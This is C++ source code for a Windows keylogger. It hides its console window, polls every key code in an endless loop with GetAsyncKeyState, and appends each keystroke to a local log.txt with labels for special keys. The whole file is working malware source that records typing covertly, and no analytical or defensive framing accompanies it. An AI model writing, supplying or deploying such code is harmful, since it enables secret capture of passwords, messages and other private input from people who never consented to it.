#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>

using namespace std;

void log();

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    log();

    return 0;
}

void log() {
    char c;

    while (true) {
        for (c=1;c<=254;c++) {
            
            if (GetAsyncKeyState(c) & 0x1) {
                ofstream log;
                log.open("log.txt", ios::app);
                
                switch (c) {
                    case VK_BACK:
                        log << "[backspace]";

                        break;
                    case VK_RETURN:
                        log << "[enter]";

                        break;
                    case VK_SHIFT:
                        log << "[shift]";

                        break;
                    case VK_CONTROL:
                        log << "[control]";

                        break;
                    case VK_CAPITAL:
                        log << "[cap]";

                        break;
                    case VK_TAB:
                        log << "[tab]";

                        break;
                    case VK_MENU:
                        log << "[alt]";

                        break;
                    default:
                        log << c;
                }

                log.close();
            }
        }
    }    
}